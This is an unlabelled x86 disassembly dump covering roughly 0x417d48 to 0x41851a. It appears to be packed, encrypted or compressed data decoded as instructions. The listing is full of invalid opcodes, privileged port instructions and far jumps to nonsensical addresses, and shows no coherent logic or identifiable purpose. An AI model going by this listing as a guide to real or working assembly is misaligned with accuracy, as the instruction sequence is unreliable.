  417d48:	xchg   ebx,eax
  417d49:	or     BYTE PTR [esi+0x36],0xee
  417d4d:	inc    eax
  417d4e:	or     BYTE PTR [ebp-0x73],ah
  417d51:	jne    0x417d62
  417d53:	int3   
  417d54:	leave  
  417d55:	rcr    DWORD PTR [edi+0x69c04f77],1
  417d5b:	loopne 0x417d5f
  417d5d:	inc    eax
  417d5e:	into   
  417d5f:	outs   dx,BYTE PTR ds:[esi]
  417d60:	mov    WORD PTR [edx+0x39],fs
  417d63:	mov    BYTE PTR [ecx],dh
  417d65:	jge    0x417d14
  417d67:	push   eax
  417d68:	pop    ebp
  417d69:	add    BYTE PTR [ecx],cl
  417d6b:	dec    edi
  417d6c:	aas    
  417d6d:	pop    esp
  417d6e:	xchg   DWORD PTR [edx-0x71],esi
  417d71:	xor    dh,BYTE PTR fs:[ebx]
  417d74:	sub    ebp,edx
  417d76:	fwait
  417d77:	push   ebx
  417d78:	mov    cs,WORD PTR [edi]
  417d7a:	cmc    
  417d7b:	imul   ebp,DWORD PTR [esi],0x2d
  417d7e:	cld    
  417d7f:	sub    esi,edx
  417d81:	(bad)  
  417d82:	je     0x417dee
  417d84:	mov    ds:0x91f9d1bb,al
  417d89:	(bad)  
  417d8a:	lock (bad) 
  417d8d:	mov    dl,0x1a
  417d8f:	inc    esp
  417d90:	jle    0x417d31
  417d92:	cmp    BYTE PTR [edx+0x4d63c9d6],cl
  417d98:	mov    ds:0x25b84b72,eax
  417d9d:	sub    dl,dl
  417d9f:	pop    edx
  417da0:	fimul  DWORD PTR [ebp+eax*8-0x72406906]
  417da7:	mov    al,ds:0x2fcaf641
  417dac:	lods   eax,DWORD PTR ds:[esi]
  417dad:	add    dl,dh
  417daf:	jg     0x417db8
  417db1:	cmp    eax,0x8cc90cc9
  417db6:	xchg   esp,eax
  417db7:	test   al,0x5c
  417db9:	sbb    al,ah
  417dbb:	jae    0x417def
  417dbd:	add    BYTE PTR [ebx+0x66],ah
  417dc0:	sbb    al,0xe5
  417dc2:	add    eax,0xf4122d9b
  417dc7:	mov    eax,0x176016c6
  417dcc:	dec    eax
  417dcd:	mov    BYTE PTR [eax-0x405cbe8],bl
  417dd3:	fadd   QWORD PTR [esi+0x1a]
  417dd6:	pop    edi
  417dd7:	repnz sub DWORD PTR [ebp+0x14],0xf4231f5f
  417ddf:	ins    DWORD PTR es:[edi],dx
  417de0:	cwde   
  417de1:	inc    ebp
  417de2:	stos   BYTE PTR es:[edi],al
  417de3:	pop    edx
  417de4:	neg    BYTE PTR [ebx+0x7965d3c7]
  417dea:	cwde   
  417deb:	icebp  
  417dec:	jmp    0x417e63
  417dee:	xor    ebp,DWORD PTR [edi]
  417df0:	mov    esp,0x11fd29ff
  417df5:	lea    edx,[edx]
  417df7:	push   esp
  417df8:	jbe    0x417dd6
  417dfa:	imul   ebp,DWORD PTR [ebp-0x4],0xb0d1406a
  417e01:	sbb    al,BYTE PTR [eax]
  417e03:	jmp    0x417e45
  417e05:	pop    ecx
  417e06:	mov    ds:0x534abb38,al
  417e0b:	jecxz  0x417dac
  417e0d:	ins    DWORD PTR es:[edi],dx
  417e0e:	jnp    0x417e68
  417e10:	lahf   
  417e11:	repnz lods al,BYTE PTR ds:[esi]
  417e13:	or     DWORD PTR [eax-0x501d970],ebx
  417e19:	sbb    bl,dl
  417e1b:	mov    edx,0x6ec96217
  417e20:	pop    eax
  417e21:	sub    eax,0xcb84ff29
  417e26:	hlt    
  417e27:	or     eax,0x6cef31e4
  417e2c:	into   
  417e2d:	test   BYTE PTR [ecx+0x71f3aa32],ch
  417e33:	outs   dx,DWORD PTR ds:[esi]
  417e34:	fidiv  DWORD PTR [edi+0x88af2fa]
  417e3a:	mov    edi,0xdd5e71ee
  417e3f:	mov    WORD PTR [edi+0x6c],es
  417e42:	cs jmp 0x417e32
  417e45:	add    bh,bl
  417e47:	imul   ecx,eax,0xffffff9c
  417e4a:	add    eax,0x7666a183
  417e4f:	add    eax,0xacbb000a
  417e54:	mov    bh,0xfe
  417e56:	loopne 0x417e61
  417e58:	loopne 0x417e5b
  417e5a:	adc    ebp,DWORD PTR [ebx+eax*8]
  417e5d:	inc    ebp
  417e5e:	mov    bh,BYTE PTR [edx]
  417e60:	fwait
  417e61:	test   DWORD PTR [ebx],ebp
  417e63:	lock inc ecx
  417e65:	aaa    
  417e66:	stos   BYTE PTR es:[edi],al
  417e67:	cmc    
  417e68:	jae    0x417ee1
  417e6a:	iret   
  417e6b:	test   DWORD PTR [esi],0x5f05c039
  417e71:	inc    eax
  417e72:	rcr    DWORD PTR [eax+0x6c547a49],0x65
  417e79:	push   cs
  417e7a:	popf   
  417e7b:	clc    
  417e7c:	sbb    BYTE PTR [ecx],0xe
  417e7f:	das    
  417e80:	jb     0x417e89
  417e82:	jbe    0x417e77
  417e84:	in     eax,dx
  417e85:	jmp    0x417e0a
  417e87:	(bad)
  417e8b:	jge    0x417efe
  417e8d:	repnz adc al,0xf8
  417e90:	cmp    eax,DWORD PTR [ecx-0x7e54644b]
  417e96:	aaa    
  417e97:	mov    esp,0x78a7b89a
  417e9c:	aaa    
  417e9d:	xchg   edi,eax
  417e9e:	jo     0x417ee7
  417ea0:	(bad)  
  417ea1:	in     al,dx
  417ea2:	pushf  
  417ea3:	and    esp,DWORD PTR [ecx-0x5fb783a9]
  417ea9:	in     al,dx
  417eaa:	fcomp  QWORD PTR [ebp-0x79]
  417ead:	nop
  417eae:	cwde   
  417eaf:	dec    ebx
  417eb0:	pushf  
  417eb1:	adc    eax,0xc343fb77
  417eb6:	push   edi
  417eb7:	mov    cl,0x56
  417eb9:	xor    BYTE PTR [ecx+0x2ad06018],ah
  417ebf:	mov    edi,0xdb17f4c3
  417ec4:	push   edi
  417ec5:	cmc    
  417ec6:	pop    edi
  417ec7:	xchg   edx,eax
  417ec8:	mov    edi,cs
  417eca:	sub    dh,BYTE PTR [esi+0x13]
  417ecd:	inc    ecx
  417ece:	scas   al,BYTE PTR es:[edi]
  417ecf:	pop    DWORD PTR [ebp-0x80]
  417ed2:	sbb    esp,DWORD PTR [edi-0x1e0ffa87]
  417ed8:	push   0xe2f4e56d
  417edd:	pop    esi
  417ede:	xchg   bl,dh
  417ee0:	das    
  417ee1:	ret    0x306a
  417ee4:	cmp    al,0x8a
  417ee6:	cmp    eax,0x380dc90c
  417eeb:	xor    BYTE PTR [ebx-0x14ea586],dh
  417ef1:	dec    si
  417ef3:	jg     0x417ea7
  417ef5:	out    dx,al
  417ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ef7:	sti    
  417ef8:	xchg   edx,eax
  417ef9:	test   DWORD PTR [ebp-0x3e],ebx
  417efc:	daa    
  417efd:	push   ss
  417efe:	push   es
  417eff:	and    bh,BYTE PTR [ebx-0x55]
  417f02:	call   0xc919:0x93504ca3
  417f09:	dec    eax
  417f0a:	fldcw  WORD PTR [eax-0x5a36f6d5]
  417f10:	dec    esp
  417f11:	call   0xee84:0xd1748c2a
  417f18:	jne    0x417f07
  417f1a:	and    al,0x2c
  417f1c:	test   al,0x42
  417f1e:	add    eax,0xc53596af
  417f23:	lods   al,BYTE PTR ds:[esi]
  417f24:	test   eax,0xba1f1399
  417f29:	sub    esp,DWORD PTR [edx]
  417f2b:	mov    ch,0xd5
  417f2d:	stc    
  417f2e:	int    0x9f
  417f30:	test   DWORD PTR [edx],0x42dda09b
  417f36:	loopne 0x417f5c
  417f38:	shr    DWORD PTR [ebx-0x1f],cl
  417f3b:	les    ebx,FWORD PTR [ebp-0x3c929399]
  417f41:	mov    dh,0x58
  417f43:	sbb    al,0x36
  417f45:	mov    eax,0xf12d8244
  417f4a:	adc    al,0xf0
  417f4c:	out    dx,eax
  417f4d:	loop   0x417f80
  417f4f:	sbb    BYTE PTR [edx+0x35c50913],dh
  417f55:	nop
  417f56:	push   ss
  417f57:	cmp    ch,BYTE PTR es:[edx-0x7f]
  417f5b:	mov    ebx,DWORD PTR es:[edx]
  417f5e:	sub    dh,BYTE PTR [eax]
  417f60:	aam    0xbb
  417f62:	sub    DWORD PTR [ebx],ecx
  417f64:	test   DWORD PTR [esi-0x7ee3dbdd],0xf63d78d5
  417f6e:	xor    BYTE PTR [ecx+0x5083b277],0x9
  417f75:	das    
  417f76:	clc    
  417f77:	(bad)
  417f7a:	dec    ebx
  417f7b:	fs push esp
  417f7d:	pop    ds
  417f7e:	mov    eax,ds:0x79dae639
  417f83:	adc    BYTE PTR [eax-0x18],dh
  417f86:	stos   DWORD PTR es:[edi],eax
  417f87:	addr16 xchg edx,eax
  417f89:	jle    0x417fa2
  417f8b:	repz cmp eax,0x9cdc36e3
  417f91:	fs xchg ecx,eax
  417f93:	addr16 jmp 0x417f28
  417f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f97:	inc    edx
  417f98:	cli    
  417f99:	pop    esp
  417f9a:	loop   0x417f32
  417f9c:	xchg   ebx,eax
  417f9d:	sub    esi,DWORD PTR [ecx-0x6dcc2950]
  417fa3:	mov    ebx,0x3ac7e21f
  417fa8:	test   edx,eax
  417faa:	inc    ecx
  417fab:	(bad)
  417fae:	cmp    al,0x26
  417fb0:	add    eax,0xac44dd36
  417fb5:	test   al,0x7b
  417fb7:	cmp    dl,BYTE PTR [ebx]
  417fb9:	jno    0x418003
  417fbb:	sub    ch,bl
  417fbd:	mov    esi,0x565f7008
  417fc2:	arpl   WORD PTR [esi+0x2b],sp
  417fc5:	aaa    
  417fc6:	imul   ebx,DWORD PTR [esi],0x3e
  417fc9:	jnp    0x418010
  417fcb:	mov    bh,BYTE PTR ds:[eax+0x59]
  417fcf:	adc    DWORD PTR [edx+0x2b0b699d],edi
  417fd5:	cli    
  417fd6:	js     0x418034
  417fd8:	cmp    bh,cl
  417fda:	in     eax,0x7a
  417fdc:	das    
  417fdd:	sbb    ch,BYTE PTR [ebx-0x5f]
  417fe0:	sbb    BYTE PTR [edx],dh
  417fe2:	push   ebp
  417fe3:	aam    0xdf
  417fe5:	push   edi
  417fe6:	sub    eax,0x69d9a391
  417feb:	pop    ebx
  417fec:	bound  ebx,QWORD PTR [ebp+0x4e]
  417fef:	adc    bh,BYTE PTR [edi-0x77]
  417ff2:	das    
  417ff3:	push   cs
  417ff4:	pushf  
  417ff5:	cmp    eax,0x9dfe50d3
  417ffa:	push   cs
  417ffb:	adc    ebx,0xffffffcd
  417ffe:	or     DWORD PTR [ecx-0x31eace02],edi
  418004:	pop    ds
  418005:	shl    BYTE PTR [ebx-0x11caa829],cl
  41800b:	ss inc ebx
  41800d:	cdq    
  41800e:	outs   dx,DWORD PTR ds:[esi]
  41800f:	xchg   ebp,eax
  418010:	call   0xf65a:0xa0a31ba6
  418017:	es and edi,ecx
  41801a:	shr    ah,cl
  41801c:	push   cs
  41801d:	sbb    al,0x78
  41801f:	(bad)  [ebp+0x2dcbb710]
  418025:	imul   eax,DWORD PTR [eax],0x1bfe7090
  41802b:	imul   DWORD PTR [edi+0x1261cfc0]
  418031:	jmp    0xf570:0x54541f97
  418038:	dec    esp
  418039:	mov    ebx,ebx
  41803b:	and    al,0xf2
  41803d:	mov    al,BYTE PTR [esi+0x3fb84e2c]
  418043:	adc    eax,0x688aa37a
  418048:	sub    bh,BYTE PTR [ebx+0x3f]
  41804b:	sbb    BYTE PTR [edi+0x5e],ch
  41804e:	mov    WORD PTR [esi+0x9],?
  418051:	in     al,dx
  418052:	fdivr  DWORD PTR [eax+0x4]
  418055:	ss retf 0xc5a0
  418059:	and    DWORD PTR [ecx+esi*2-0x37be93a7],esi
  418060:	fs sub cl,al
  418063:	ins    BYTE PTR es:[edi],dx
  418064:	lock cwde 
  418066:	jnp    0x4180c0
  418068:	and    DWORD PTR [bx+di],ecx
  41806b:	add    al,0x42
  41806d:	lea    esp,fs:[esi]
  418070:	mov    BYTE PTR [ebp-0x7d],dh
  418073:	(bad)  
  418074:	aaa    
  418075:	ss mov al,0x67
  418078:	mov    al,BYTE PTR [eax+esi*1-0x77]
  41807c:	sbb    DWORD PTR [ecx-0x2cef30c8],edi
  418082:	dec    ebp
  418083:	cmp    ecx,edx
  418085:	pop    ss
  418086:	sti    
  418087:	jmp    0xc572:0xd0342bc
  41808e:	pop    ebp
  41808f:	cmp    ebx,eax
  418091:	shl    DWORD PTR [eax+ebx*8],1
  418094:	imul   edx,DWORD PTR [ecx+0x582ae9b3],0x38
  41809b:	jp     0x41807e
  41809d:	mov    bl,0x69
  41809f:	mov    edx,0xa12d5272
  4180a4:	out    0xa8,eax
  4180a6:	sbb    ebx,ebp
  4180a8:	pop    es
  4180a9:	jmp    0x41807a
  4180ab:	add    al,0x70
  4180ad:	imul   ebx,edi,0xd6a1b2e8
  4180b3:	retf   0x32c7
  4180b6:	stos   BYTE PTR es:[edi],al
  4180b7:	rcr    DWORD PTR [edi-0x6b99fba],cl
  4180bd:	inc    eax
  4180be:	ds popa 
  4180c0:	outs   dx,DWORD PTR ds:[esi]
  4180c1:	sub    eax,DWORD PTR [ecx+0x5a]
  4180c4:	sub    BYTE PTR [edi],0x3d
  4180c7:	adc    eax,0x72eb8f71
  4180cc:	pop    ecx
  4180cd:	mov    al,ds:0x13839786
  4180d2:	push   ecx
  4180d3:	dec    edx
  4180d4:	ficomp DWORD PTR [esi]
  4180d6:	and    BYTE PTR [ecx+0x220d65cd],al
  4180dc:	xor    dh,BYTE PTR [ecx]
  4180de:	mov    DWORD PTR [edi-0x6b],eax
  4180e1:	adc    al,ch
  4180e3:	adc    cl,BYTE PTR ds:0x898c3f57
  4180e9:	mov    ds:0x576d0daa,eax
  4180ee:	rol    DWORD PTR [edx],1
  4180f0:	add    ch,BYTE PTR [esp+eax*2+0x734c9ae7]
  4180f7:	test   BYTE PTR [esi-0xa453704],0x18
  4180fe:	call   0x95f0024e
  418103:	pop    edx
  418104:	aas    
  418105:	xor    eax,0xad7c08fb
  41810a:	adc    DWORD PTR [edi+0x19],0x722beedf
  418111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418112:	xchg   ebx,eax
  418113:	mov    DWORD PTR [edx-0x5b3ded29],ebp
  418119:	cmp    DWORD PTR [eax],ebp
  41811b:	pop    ecx
  41811c:	push   esi
  41811d:	push   cs
  41811e:	aas    
  41811f:	xchg   edx,eax
  418120:	(bad)  
  418121:	push   cs
  418122:	add    esp,DWORD PTR [esi-0x2d237629]
  418128:	call   ebp
  41812a:	(bad)  
  41812b:	and    DWORD PTR [esi+0x73],ebx
  41812e:	push   ebx
  41812f:	sub    DWORD PTR [ebp+0x2d1d19e9],ebp
  418135:	jp     0x418135
  418137:	dec    edi
  418138:	fiadd  DWORD PTR [edi-0x5f781271]
  41813e:	rcr    BYTE PTR [edx-0x5b],0xe2
  418142:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418143:	shl    DWORD PTR [ebp-0x42ebf502],1
  418149:	(bad)  
  41814b:	aad    0x26
  41814d:	sbb    al,ah
  41814f:	fcomp  DWORD PTR [ebx-0x9454fb2]
  418155:	mov    esp,cs
  418157:	inc    ecx
  418158:	fisubr DWORD PTR [esi-0x51]
  41815b:	sub    DWORD PTR [edi-0x73],0x4a
  41815f:	sbb    BYTE PTR [edi-0x60],dl
  418162:	fs inc ebx
  418164:	push   edi
  418165:	out    0x2b,al
  418167:	in     eax,dx
  418168:	cdq    
  418169:	fs cli 
  41816b:	arpl   WORD PTR [ecx+0x6382a168],bx
  418171:	dec    edx
  418172:	push   edx
  418173:	jo     0x418164
  418175:	(bad)  
  418176:	ss xor al,0xad
  418179:	push   ss
  41817a:	shr    bl,1
  41817c:	cmp    DWORD PTR [esi-0x4125ef61],0xffffffaa
  418183:	mov    es,WORD PTR [edx-0x2ec8f1e5]
  418189:	pushf  
  41818a:	or     eax,0x32c12146
  41818f:	sub    al,cl
  418191:	test   BYTE PTR [eax],ah
  418193:	fwait
  418194:	inc    ebp
  418195:	call   0x249c44f0
  41819a:	add    dh,BYTE PTR [edx]
  41819c:	rol    dh,cl
  41819e:	ret    0xb72d
  4181a1:	out    0xb7,eax
  4181a3:	outs   dx,BYTE PTR ds:[esi]
  4181a4:	jmp    0x418164
  4181a6:	call   0xca00e04b
  4181ab:	cmp    edx,DWORD PTR [eax-0x6d]
  4181ae:	pop    edx
  4181af:	stos   DWORD PTR es:[edi],eax
  4181b0:	and    bh,bl
  4181b2:	hlt    
  4181b3:	sub    eax,0xfdd9fc5
  4181b8:	adc    esi,DWORD PTR [ecx-0x55]
  4181bb:	jge    0x4181cd
  4181bd:	in     eax,0x65
  4181bf:	cmp    eax,0xbdd305ff
  4181c4:	sahf   
  4181c5:	add    ebx,edi
  4181c7:	fist   WORD PTR [eax+0x14e76d99]
  4181cd:	add    BYTE PTR [ebp-0x5c18054a],dl
  4181d3:	adc    eax,0xacb30968
  4181d8:	mov    dl,0x68
  4181da:	push   ss
  4181db:	pop    eax
  4181dc:	pop    ebp
  4181dd:	mov    dl,BYTE PTR [ebx]
  4181df:	adc    ecx,ebp
  4181e1:	or     al,0x14
  4181e3:	inc    ebx
  4181e4:	xor    eax,DWORD PTR [edi*4-0x66fc8439]
  4181eb:	cmp    esi,edi
  4181ed:	pushf  
  4181ee:	xchg   edx,eax
  4181ef:	mov    DWORD PTR [esi+0x70],edx
  4181f2:	ja     0x418273
  4181f4:	mov    ebx,0xefa4be3a
  4181f9:	imul   esp,DWORD PTR [edi],0xc18ad749
  4181ff:	loopne 0x418260
  418201:	out    0x6f,eax
  418203:	scas   al,BYTE PTR es:[edi]
  418204:	xor    BYTE PTR [ebp+0x7c6165dc],bl
  41820a:	pop    eax
  41820b:	xchg   BYTE PTR [ebx+0x288a4a6f],bh
  418211:	test   BYTE PTR [ebx+0x989cb37],ch
  418217:	lds    ebx,FWORD PTR fs:[edi+0x54]
  41821b:	not    BYTE PTR [eax+0x75]
  41821e:	inc    ebx
  41821f:	gs sbb al,0x76
  418222:	and    BYTE PTR [esi],cl
  418224:	(bad)  
  418226:	inc    ebp
  418227:	mov    ebx,0xd121db13
  41822c:	fucomp st(6)
  41822e:	dec    ebp
  41822f:	mov    ds:0xc8141aba,al
  418234:	sub    bl,BYTE PTR [edx]
  418236:	nop
  418237:	es jae 0x418276
  41823a:	adc    ah,BYTE PTR [ecx]
  41823c:	fcmovu st,st(2)
  41823e:	and    ecx,esp
  418240:	push   esi
  418241:	sub    DWORD PTR [eax],ebp
  418243:	(bad)  [edi-0x6b]
  418246:	xor    dl,BYTE PTR [edx]
  418248:	xor    esi,DWORD PTR [edi*1-0x7cc39f32]
  41824f:	cmc    
  418250:	pop    edi
  418251:	nop
  418252:	pop    edx
  418253:	sti    
  418254:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  418256:	mov    bh,dh
  418258:	sbb    ebp,DWORD PTR [ebp+0x3179c0b9]
  41825e:	or     cl,BYTE PTR [ecx]
  418260:	dec    edx
  418261:	pop    ds
  418262:	dec    ebp
  418263:	lahf   
  418264:	sbb    DWORD PTR [esi+ebx*1-0x634b126c],eax
  41826b:	sub    al,0xcc
  41826d:	or     eax,0xbb7d0cdb
  418272:	dec    ebx
  418273:	jecxz  0x4182b1
  418275:	mov    ecx,0xce72c6eb
  41827a:	mov    edx,0xff6b80fe
  41827f:	jo     0x418223
  418281:	ins    BYTE PTR es:[edi],dx
  418282:	mov    ds:0xa6a6f215,al
  418287:	cmp    DWORD PTR [eax],esp
  418289:	inc    ecx
  41828a:	sahf   
  41828b:	jmp    0x7c0a:0xa3fe2556
  418292:	inc    ebp
  418293:	int3   
  418294:	sahf   
  418295:	xchg   ebp,eax
  418296:	(bad)  
  418297:	not    DWORD PTR [esi-0x31]
  41829a:	xor    DWORD PTR [edi-0x2e4449e1],ebp
  4182a0:	mov    edx,0x77c7748c
  4182a5:	mov    edx,0xbb88084b
  4182aa:	xchg   esi,eax
  4182ab:	pop    ecx
  4182ac:	push   ebp
  4182ad:	jbe    0x418291
  4182af:	adc    al,0x15
  4182b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182b2:	cmp    ebx,ecx
  4182b4:	pop    ebp
  4182b5:	test   al,0xbd
  4182b7:	push   eax
  4182b8:	popf   
  4182b9:	mov    cl,0xa2
  4182bb:	addr16 data16 sahf 
  4182be:	add    bh,BYTE PTR [ebx+0x2543109d]
  4182c4:	scas   al,BYTE PTR es:[edi]
  4182c5:	outs   dx,DWORD PTR ds:[esi]
  4182c6:	clc    
  4182c7:	scas   al,BYTE PTR es:[edi]
  4182c8:	adc    esp,DWORD PTR [edx-0x505de478]
  4182ce:	push   edx
  4182cf:	dec    ecx
  4182d0:	add    ebx,DWORD PTR [eax+0x59]
  4182d3:	pushf  
  4182d4:	stos   BYTE PTR es:[edi],al
  4182d5:	mov    ecx,gs
  4182d7:	shl    BYTE PTR [eax-0x52],1
  4182da:	sbb    BYTE PTR [ebp+0x38],0x1f
  4182de:	dec    edx
  4182df:	sbb    esp,DWORD PTR [eax+eax*8+0x42e5c57]
  4182e6:	mov    ch,0x55
  4182e8:	sub    BYTE PTR [bx+si-0x63c6],al
  4182ed:	out    dx,al
  4182ee:	pop    esp
  4182ef:	scas   eax,DWORD PTR es:[edi]
  4182f0:	dec    ebp
  4182f1:	icebp  
  4182f2:	repz cmp bl,BYTE PTR [ebp-0x6ca4e09]
  4182f9:	cld    
  4182fa:	and    edx,edi
  4182fc:	cmp    edi,DWORD PTR [eax+0x11d4fc6b]
  418302:	jmp    0x1a3b:0x6f1bf104
  418309:	imul   edx,DWORD PTR [edx-0x2fe883a8],0xffffffc4
  418310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418311:	pop    ds
  418312:	adc    DWORD PTR [ebp-0x2b],esi
  418315:	hlt    
  418316:	retf   
  418317:	shufps xmm7,XMMWORD PTR [edi],0x4e
  41831b:	call   0xd66d:0x95724396
  418322:	sub    dh,BYTE PTR [edx+0x36]
  418325:	imul   esp,DWORD PTR [eax],0xffffffd5
  418328:	inc    edi
  418329:	mov    ebp,0x9638eb47
  41832e:	es pop esi
  418330:	rcl    ebp,cl
  418332:	dec    edx
  418333:	jnp    0x41838f
  418335:	rcl    DWORD PTR [edi-0x519c4c06],0xc9
  41833c:	int    0xc6
  41833e:	jae    0x4182fe
  418340:	test   ebx,eax
  418342:	xor    esi,eax
  418344:	add    BYTE PTR [ecx+0x22],ch
  418347:	pop    ebx
  418348:	sti    
  418349:	(bad)  
  41834a:	in     eax,0xb5
  41834c:	(bad)  
  41834d:	(bad)  
  41834e:	in     eax,dx
  41834f:	push   ebx
  418350:	cld    
  418351:	iret   
  418352:	mov    ds:0x2b5c0a49,eax
  418357:	sbb    DWORD PTR [ebx+0x72],ebp
  41835a:	ja     0x41837e
  41835c:	repz lock and ebp,DWORD PTR [ebx+0x68]
  418361:	push   es
  418362:	pushf  
  418363:	push   edi
  418364:	fist   WORD PTR [edx-0xd]
  418367:	sub    esp,DWORD PTR [ecx+ebx*1]
  41836a:	xchg   esi,eax
  41836b:	daa    
  41836c:	mov    cl,0xcd
  41836e:	data16 lods al,BYTE PTR ds:[esi]
  418370:	jbe    0x418373
  418372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418373:	add    al,bh
  418375:	sub    ah,BYTE PTR [ebx+ebp*2]
  418378:	jne    0x418324
  41837a:	enter  0x581c,0x27
  41837e:	imul   eax,esp,0xe5ac7e08
  418384:	pop    ebp
  418385:	into   
  418386:	lds    ebx,FWORD PTR ds:0x5d294bb0
  41838c:	xlat   BYTE PTR ds:[ebx]
  41838d:	jae    0x418346
  41838f:	xor    edx,DWORD PTR [edi+0x46]
  418392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418393:	and    ecx,ecx
  418395:	jnp    0x418403
  418397:	ret    
  418398:	xchg   ebp,eax
  418399:	push   ebx
  41839a:	add    al,0xa6
  41839c:	aam    0x2c
  41839e:	retf   0xfa4c
  4183a1:	jne    0x4183ef
  4183a3:	pop    edx
  4183a4:	out    dx,al
  4183a5:	pop    edx
  4183a6:	jecxz  0x418399
  4183a8:	dec    edx
  4183a9:	sub    DWORD PTR [esi],0x35
  4183ac:	cdq    
  4183ad:	ins    DWORD PTR es:[edi],dx
  4183ae:	mov    edi,0xcb186a6d
  4183b3:	les    ebx,FWORD PTR [edx-0x6]
  4183b6:	stos   BYTE PTR es:[edi],al
  4183b7:	or     ebx,esp
  4183b9:	aas    
  4183ba:	add    BYTE PTR [ecx-0x42fcb564],cl
  4183c0:	ret    0xdcaf
  4183c3:	sbb    eax,DWORD PTR [ebx]
  4183c5:	ror    ah,cl
  4183c7:	or     al,0x5a
  4183c9:	add    BYTE PTR [esi+0xa80f42b],dh
  4183cf:	jmp    0x2978aa08
  4183d4:	loopne 0x4183e9
  4183d6:	push   es
  4183d7:	inc    ecx
  4183d8:	fld    QWORD PTR [edx]
  4183da:	push   eax
  4183db:	lock ins DWORD PTR es:[edi],dx
  4183dd:	stos   BYTE PTR es:[edi],al
  4183de:	cmp    al,0x33
  4183e0:	pop    ecx
  4183e1:	in     al,dx
  4183e2:	lods   al,BYTE PTR ds:[esi]
  4183e3:	fisubr WORD PTR [eiz*8-0x4c23dcf4]
  4183ea:	retf   0x48a6
  4183ed:	pop    ebx
  4183ee:	inc    eax
  4183ef:	cmp    cl,al
  4183f1:	das    
  4183f2:	mov    esi,0x6757ad7f
  4183f7:	popf   
  4183f8:	add    eax,0x942d84b0
  4183fd:	mov    al,0x1e
  4183ff:	shr    DWORD PTR [edi+0x69],1
  418402:	mov    WORD PTR [esi+ebx*1+0x4c],?
  418406:	ins    DWORD PTR es:[edi],dx
  418407:	test   eax,0xd82ceeda
  41840c:	stc    
  41840d:	fwait
  41840e:	pop    edx
  41840f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418410:	mov    dh,0x8c
  418412:	ret    0x7d03
  418415:	fistp  DWORD PTR [esi]
  418417:	inc    esi
  418419:	pop    edi
  41841a:	mov    bl,0x89
  41841c:	ins    BYTE PTR es:[edi],dx
  41841d:	cmp    al,0x9c
  41841f:	mov    BYTE PTR [esi-0x33],ah
  418422:	push   esp
  418423:	xor    bl,ah
  418425:	inc    esi
  418426:	out    0x2e,eax
  418428:	shl    BYTE PTR [eax],cl
  41842a:	dec    BYTE PTR ds:0xeee5c520
  418430:	aam    0x93
  418432:	ret    
  418433:	sub    BYTE PTR [ebx-0x319e22cb],0x72
  41843a:	rol    DWORD PTR [edx+0x59],0xff
  41843e:	cdq    
  41843f:	dec    esp
  418440:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  418442:	lods   al,BYTE PTR ds:[esi]
  418443:	jge    0x418404
  418445:	icebp  
  418446:	scas   al,BYTE PTR es:[edi]
  418447:	sub    dl,BYTE PTR [eax]
  418449:	test   eax,0xad5ab38e
  41844e:	push   cs
  41844f:	add    al,0x3b
  418451:	add    BYTE PTR [eax+0x137f6290],ch
  418457:	ja     0x4184ca
  418459:	int    0x83
  41845b:	push   ecx
  41845c:	push   ebp
  41845d:	call   0xd016205b
  418462:	ret    0x7619
  418465:	rol    BYTE PTR [edx-0x1effa951],cl
  41846b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41846c:	sbb    BYTE PTR [eax-0x38],al
  41846f:	ret    
  418470:	mov    ah,0x37
  418472:	push   es
  418473:	add    edi,eax
  418475:	and    BYTE PTR [ecx],ah
  418477:	sub    al,0x52
  418479:	add    esi,DWORD PTR ds:0x65a3a367
  41847f:	stc    
  418480:	scas   eax,DWORD PTR es:[edi]
  418481:	aad    0x83
  418483:	inc    ebp
  418484:	and    DWORD PTR [edi+eax*8],0xfb4b7e3
  41848b:	mov    dh,0x5f
  41848d:	cld    
  41848e:	jge    0x4184a7
  418490:	cmp    BYTE PTR [ecx-0x7c],dl
  418493:	mov    esi,0x21134898
  418498:	lea    edx,[ebp-0x50fd45]
  41849e:	mov    bl,0xcc
  4184a0:	ficomp DWORD PTR [edx+ecx*8-0x67]
  4184a4:	sub    eax,0x846714a8
  4184aa:	fsubp  st(1),st
  4184ac:	jae    0x418518
  4184ae:	aad    0x2f
  4184b0:	adc    BYTE PTR [ecx-0x7c],ch
  4184b3:	adc    bl,BYTE PTR [edi-0x67]
  4184b6:	push   edi
  4184b7:	out    0x90,al
  4184b9:	out    0x3b,al
  4184bb:	pop    esp
  4184bc:	cmp    cl,BYTE PTR [edi]
  4184be:	scas   al,BYTE PTR es:[edi]
  4184bf:	dec    esi
  4184c0:	js     0x418481
  4184c2:	cmp    al,0x41
  4184c4:	jle    0x4184da
  4184c6:	jb     0x418470
  4184c8:	pop    edx
  4184c9:	pop    edx
  4184ca:	pop    ebp
  4184cb:	mov    ah,0x10
  4184cd:	ss cli 
  4184cf:	js     0x4184c9
  4184d1:	ins    DWORD PTR es:[edi],dx
  4184d2:	inc    ebp
  4184d3:	shr    DWORD PTR [ebx+0x47d0fd21],0x47
  4184da:	add    al,0x21
  4184dc:	retf   
  4184dd:	retf   0x7312
  4184e0:	fwait
  4184e1:	add    al,0x77
  4184e3:	sti    
  4184e4:	jle    0x41854b
  4184e6:	add    edx,edi
  4184e8:	sbb    ebx,DWORD PTR [edi+0x2042dff7]
  4184ee:	out    dx,al
  4184ef:	jl     0x4184a3
  4184f1:	jmp    0x139f7507
  4184f6:	lahf   
  4184f7:	out    dx,al
  4184f8:	sbb    eax,0x2e5e3586
  4184fd:	test   DWORD PTR [edi-0x1e],ecx
  418500:	ds or  dl,ah
  418503:	fcomp  QWORD PTR [eax+ecx*2+0x76ceb2e2]
  41850a:	das    
  41850b:	pop    eax
  41850c:	lock xchg edi,eax
  41850e:	repnz sbb eax,0x8d85ba02
  418514:	enter  0x737a,0xf9
  418518:	retf   0x2ada
